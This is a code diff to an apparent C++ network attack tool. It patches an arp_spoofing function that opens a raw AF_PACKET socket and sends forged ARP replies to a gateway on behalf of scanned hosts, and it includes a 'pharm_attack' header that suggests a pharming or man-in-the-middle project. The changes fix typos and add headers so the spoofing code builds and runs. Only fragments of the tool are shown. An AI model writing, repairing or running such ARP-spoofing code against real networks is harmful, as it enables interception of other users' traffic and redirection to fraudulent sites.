@@ -12,8 +12,10 @@
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/time.h>
+#include <linux/if_packet.h>
 
 #include "scan.h"
+#include "arp.h"
 #include "pharm_attack.h"
 
 using namespace std;
@@ -21,7 +23,7 @@ using namespace std;
 void arp_spoofing(string local_ip, string local_mac, string gateway_ip, vector<pair<string, string>> answered_list){
 
     //creat raw socket
-    int sockfd = socket(AF_PACKET,SOCK_ROW, htons(ETH_P_ARP));
+    int sockfd = socket(AF_PACKET,SOCK_RAW, htons(ETH_P_ARP));
     if (sockfd <0) {
         perror ("socket() failed");
         exit (EXIT_FAILURE);
@@ -58,7 +60,7 @@ void arp_spoofing(string local_ip, string local_mac, string gateway_ip, vector<p
     for(auto i = 0; i < answered_list.size(); i++){
 
         //to gateway
-        arp_reply_gateqay.sender_ip = inet_addr(answered_list[i].first.c_str());
+        arp_reply_gateway.sender_ip = inet_addr(answered_list[i].first.c_str());
 
         //send packet to gateway
         sendto(sockfd, &arp_reply_gateway, sizeof(arp_reply_gateway), 0, (struct sockaddr*)&device, sizeof(device));
